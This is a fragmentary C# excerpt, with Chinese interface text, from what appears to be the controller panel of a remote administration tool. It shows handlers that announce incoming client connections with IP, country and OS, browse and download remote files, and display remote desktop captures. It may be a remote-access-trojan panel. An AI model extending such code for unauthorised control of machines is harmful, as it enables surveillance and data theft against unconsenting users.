...
namespace Nova.Commands
{
    ...
    { 
        ...
        {
            mainForm.nIcon.ShowBalloonTip(1000, string.Format("连接来自 {0}!", c.Value.Country), string.Format("IP地址: {0}\n操作系统: {1}", c.EndPoint.Address.ToString(), c.Value.OperatingSystem), ToolTipIcon.Info);
        }
            ...
            new Thread(new ThreadStart(() =>
            {
                ...
                if (packet.Files.Length != 0)
                {
                    for (int i = 0; i < packet.Files.Length; i++)
                    {
                        ...
                        {
                            ListViewItem lvi = new ListViewItem(new string[] { packet.Files[i], HelpMe.GetFileSize(packet.FilesSize[i]), "File" });
                            lvi.Tag = "file";

                            lvi.ImageIndex = HelpMe.GetFileIcon(System.IO.Path.GetExtension(packet.Files[i]));
        ...
        public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
        {
            ...
            if (File.Exists(downloadPath))
                if (MessageBox.Show(string.Format("文件 '{0}' 已经存在!\n需要覆盖吗?", packet.Filename), "覆盖信息", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != System.Windows.Forms.DialogResult.Yes)
                    Continue = false;
        ...
        public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
        {
            ...
            {
                Bitmap newScreen = (Bitmap)HelpMe.CByteToImg(packet.Image);
            ...
            {
                Bitmap screen = (Bitmap)HelpMe.CByteToImg(packet.Image);
